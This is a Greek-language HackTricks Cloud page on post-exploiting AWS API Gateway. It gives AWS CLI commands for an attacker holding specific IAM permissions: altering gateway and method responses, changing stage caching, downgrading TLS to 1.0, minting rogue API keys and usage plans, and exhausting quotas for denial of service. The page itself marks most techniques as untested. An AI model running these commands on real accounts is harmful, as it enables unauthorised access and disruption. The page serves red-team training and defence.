# AWS - Εκμετάλλευση μετά την εισβολή στο API Gateway

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## API Gateway

Για περισσότερες πληροφορίες, ελέγξτε:

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### Πρόσβαση σε μη αποκαλυπτόμενα APIs

Μπορείτε να δημιουργήσετε ένα σημείο πρόσβασης στη διεύθυνση [https://us-east-1.console.aws.amazon.com/vpc/home#CreateVpcEndpoint](https://us-east-1.console.aws.amazon.com/vpc/home?region=us-east-1#CreateVpcEndpoint:) με την υπηρεσία com.amazonaws.us-east-1.execute-api, να αποκαλύψετε το σημείο πρόσβασης σε ένα δίκτυο όπου έχετε πρόσβαση (πιθανώς μέσω μιας μηχανής EC2) και να αναθέσετε έναν ομάδα ασφαλείας που επιτρέπει όλες τις συνδέσεις.\
Έπειτα, από τη μηχανή EC2 θα μπορείτε να έχετε πρόσβαση στο σημείο πρόσβασης και, συνεπώς, να καλέσετε το API της πύλης που δεν είχε αποκαλυφθεί προηγουμένως.

### Επιθέσεις DoS στα σχέδια χρήσης

Στην ενότητα **Απαρίθμηση** μπορείτε να δείτε πώς να **αποκτήσετε το σχέδιο χρήσης** των κλειδιών. Εάν έχετε το κλειδί και είναι **περιορισμένο** σε X χρήσεις **ανά μήνα**, μπορείτε απλά να το **χρησιμοποιήσετε και να προκαλέσετε μια επίθεση DoS**.

Το **κλειδί API** πρέπει απλά να **συμπεριληφθεί** μέσα σε ένα **HTTP header** με το όνομα **`x-api-key`**.

### `apigateway:UpdateGatewayResponse`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τις άδειες `apigateway:UpdateGatewayResponse` και `apigateway:CreateDeployment` μπορεί να **τροποποιήσει μια υπάρχουσα απόκριση πύλης για να περιλαμβάνει προσαρμοσμένους κεφαλίδες ή πρότυπα απόκρισης που διαρρέουν ευαίσθητες πληροφορίες ή εκτελούν κακόβουλα σενάρια**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
RESPONSE_TYPE="DEFAULT_4XX"

# Update the Gateway Response
aws apigateway update-gateway-response --rest-api-id $API_ID --response-type $RESPONSE_TYPE --patch-operations op=replace,path=/responseTemplates/application~1json,value="{\"message\":\"$context.error.message\", \"malicious_header\":\"malicious_value\"}"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Πιθανές Επιπτώσεις**: Διαρροή ευαίσθητων πληροφοριών, εκτέλεση κακόβουλων σεναρίων ή μη εξουσιοδοτημένη πρόσβαση σε πόρους του API.

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

### `apigateway:UpdateStage`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τις άδειες `apigateway:UpdateStage` και `apigateway:CreateDeployment` μπορεί να **τροποποιήσει έναν υπάρχοντα στάδιο του API Gateway για να ανακατευθύνει την κίνηση σε ένα διαφορετικό στάδιο ή να αλλάξει τις ρυθμίσεις της προσωρινής αποθήκευσης για να αποκτήσει μη εξουσιοδοτημένη πρόσβαση σε αποθηκευμένα δεδομένα**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
STAGE_NAME="Prod"

# Update the API Gateway stage
aws apigateway update-stage --rest-api-id $API_ID --stage-name $STAGE_NAME --patch-operations op=replace,path=/cacheClusterEnabled,value=true,op=replace,path=/cacheClusterSize,value="0.5"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Πιθανές Επιπτώσεις**: Μη εξουσιοδοτημένη πρόσβαση σε κρυφά δεδομένα, διαταραχή ή παρεμπόδιση της κίνησης του API.

{% hint style="info" %}
Χρειάζεται δοκιμή
{% endhint %}

### `apigateway:PutMethodResponse`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τις άδειες `apigateway:PutMethodResponse` και `apigateway:CreateDeployment` μπορεί να **τροποποιήσει την απόκριση μεθόδου ενός υπάρχοντος μεθόδου API Gateway REST API για να περιλαμβάνει προσαρμοσμένους κεφαλίδες ή πρότυπα απόκρισης που διαρρέουν ευαίσθητες πληροφορίες ή εκτελούν κακόβουλα σενάρια**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
STATUS_CODE="200"

# Update the method response
aws apigateway put-method-response --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --status-code $STATUS_CODE --response-parameters "method.response.header.malicious_header=true"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Πιθανές Επιπτώσεις**: Διαρροή ευαίσθητων πληροφοριών, εκτέλεση κακόβουλων σεναρίων ή μη εξουσιοδοτημένη πρόσβαση σε πόρους του API.

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

### `apigateway:UpdateRestApi`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τις άδειες `apigateway:UpdateRestApi` και `apigateway:CreateDeployment` μπορεί να **τροποποιήσει τις ρυθμίσεις του API Gateway REST API για να απενεργοποιήσει την καταγραφή καταγραφής ή να αλλάξει την ελάχιστη έκδοση TLS, πιθανώς αποδυναμώνοντας την ασφάλεια του API**.
```bash
API_ID="your-api-id"

# Update the REST API settings
aws apigateway update-rest-api --rest-api-id $API_ID --patch-operations op=replace,path=/minimumTlsVersion,value='TLS_1.0',op=replace,path=/apiKeySource,value='AUTHORIZER'

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Πιθανές Επιπτώσεις**: Αποδυνάμωση της ασφάλειας του API, πιθανή επιτροπή μη εξουσιοδοτημένης πρόσβασης ή αποκάλυψη ευαίσθητων πληροφοριών.

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

### `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, `apigateway:CreateUsagePlanKey`

Ένας επιτιθέμενος με δικαιώματα `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan` και `apigateway:CreateUsagePlanKey` μπορεί να **δημιουργήσει νέα κλειδιά API, να τα συσχετίσει με σχέδια χρήσης και στη συνέχεια να χρησιμοποιήσει αυτά τα κλειδιά για μη εξουσιοδοτημένη πρόσβαση σε APIs**.
```bash
# Create a new API key
API_KEY=$(aws apigateway create-api-key --enabled --output text --query 'id')

# Create a new usage plan
USAGE_PLAN=$(aws apigateway create-usage-plan --name "MaliciousUsagePlan" --output text --query 'id')

# Associate the API key with the usage plan
aws apigateway create-usage-plan-key --usage-plan-id $USAGE_PLAN --key-id $API_KEY --key-type API_KEY
```
**Πιθανές Επιπτώσεις**: Μη εξουσιοδοτημένη πρόσβαση σε πόρους του API, παράκαμψη ελέγχων ασφαλείας.

{% hint style="info" %}
Χρειάζεται δοκιμή
{% endhint %}

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
